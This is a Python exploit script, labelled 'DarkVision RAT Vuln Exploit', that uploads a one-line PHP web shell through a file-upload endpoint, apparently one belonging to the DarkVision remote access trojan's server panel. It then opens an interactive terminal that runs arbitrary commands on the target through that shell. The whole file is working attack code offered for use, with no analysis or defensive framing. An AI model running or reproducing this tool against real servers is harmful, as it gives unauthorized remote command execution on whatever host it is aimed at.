import requests
import random
import string
import io
import os
import argparse
from urllib.parse import urlparse

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def upload_shell(url, hwid, logfoldername, shell_content):
    data = {
        "hwid": hwid,
        "logfoldername": logfoldername,
    }
    files = {
        "uploaded_file": ("shell.php", io.BytesIO(shell_content.encode("utf-8")), "application/x-php"),
    }
    response = requests.post(url, data=data, files=files)
    return response

def fancy_terminal(shell_url):
    os.system("clear" if os.name == "posix" else "cls")
    print("╔═════════════════════════════════════════════════════════════╗")
    print("║               DarkVision RAT Vuln - Terminal                ║")
    print("╚═════════════════════════════════════════════════════════════╝")
    while True:
        try:
            cmd = input("darkvision-vuln@remote $ ").strip()
            if cmd.lower() in ["exit", "quit"]:
                print("[*] Exiting the terminal. Goodbye!")
                break
            response = requests.get(shell_url, params={"cmd": cmd})
            if response.status_code == 200:
                output = response.text.strip()
                print(output if output else "[!] Command executed successfully, but no output was returned.")
            else:
                print(f"[!] Error: Received HTTP {response.status_code} from the server.")
        except KeyboardInterrupt:
            print("\n[*] Session interrupted. Goodbye!")
            break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DarkVision RAT Vuln Exploit")
    parser.add_argument("-u", "--url", required=True, help="Target URL to upload the shell (e.g., https://example.com/upload.php)")
    parser.add_argument("-o", "--hwid", default=generate_random_string(12), help="HWID value (default: randomly generated)")
    parser.add_argument("-l", "--logfoldername", default=generate_random_string(16), help="Log folder name (default: randomly generated)")

    args = parser.parse_args()

    shell_content = "<?php echo shell_exec($_GET['cmd']); ?>"
    print("[*] Uploading shell to the target...")
    response = upload_shell(args.url, args.hwid, args.logfoldername, shell_content)

    if response.status_code == 200:
        parsed_url = urlparse(args.url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        shell_url = f"{base_url}/uploads/{args.hwid}/{args.logfoldername}/shell.php"
        print(f"[+] Shell URL: {shell_url}")
        fancy_terminal(shell_url)
    else:
        print(f"[!] Failed to upload shell. HTTP {response.status_code}: {response.text}")
